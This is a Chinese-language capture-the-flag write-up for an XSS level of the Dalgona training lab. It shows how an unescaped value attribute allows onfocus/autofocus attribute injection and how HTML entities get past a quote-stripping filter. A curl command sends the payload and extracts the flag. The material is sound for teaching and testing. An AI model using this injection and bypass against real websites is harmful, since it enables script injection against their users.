## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 15 关
（样式表 `static/css/xss/xss15.css`，标题 `Dalgona - Triangle`）。

输入被回填到输入框的 `value` 属性：

```html
<input type=text name=name placeholder="Enter your name..." value="abc">
```

### 关键观察

**1. `value` 属性里的双引号没有被转义，会直接闭合属性。**

| 输入 | 渲染 |
| --- | --- |
| `abc` | `<input … value="abc">` |
| `" autofocus onfocus=alert('XSS') x="` | `<input … value="" autofocus onfocus=alert() x="">` |

注意第二条：属性注入成功了（`autofocus` / `onfocus` 都成了真的属性），
但 `alert('XSS')` 里的 **`'XSS'` 被整段删掉**，只剩下 `alert()`。
错误信息也印证了这一点：

```text
Oops! You did an alert with undefined instead of "XSS"
```

即 `alert` 被调用了，但参数是 `undefined`。

**2. 单引号被剥，但 HTML 实体可用。**

`'XSS'`、`"XSS"` 都会被处理掉；而 `&#34;` / `&quot;` / `&#x22;` 三种实体都保留，
并且在属性值里会被 HTML 解析器解码成真正的双引号再交给 JS。

```html
" autofocus onfocus=alert(&#34;XSS&#34;) x="
```

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=" autofocus onfocus=alert(&#34;XSS&#34;) x="' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

```text
flag{7d276ebf-5879-4c1f-937f-c8204d0131d4}
```

## 复盘

- **属性注入 + `autofocus` 是「不能造标签」时的标准解法。**
  这里 `value="…"` 没做转义，一个 `"` 就能闭合，再用空格加新属性。
- **失败信息能告诉你 payload 执行到了哪一步。**
  `You did an alert with undefined instead of "XSS"` 说明 `alert` 真的被调用了，
  只是参数被过滤成 `undefined`——于是问题被精确定位到「引号处理」而不是「触发时机」。
- **引号被剥时优先试 HTML 实体。** `&#34;`/`&quot;`/`&#x22;` 在属性值里会被解码，
  而且不会提前结束属性（解码发生在分词之后）。
- **收尾要吃掉模板的闭合引号。** payload 末尾的 `x="` 让模板自带的 `"`
  变成空属性 `x=""` 的结束符，避免结构错乱。
- **`autofocus` 必须写**，否则 `onfocus` 在 无头浏览器里不会触发（没有用户交互）。
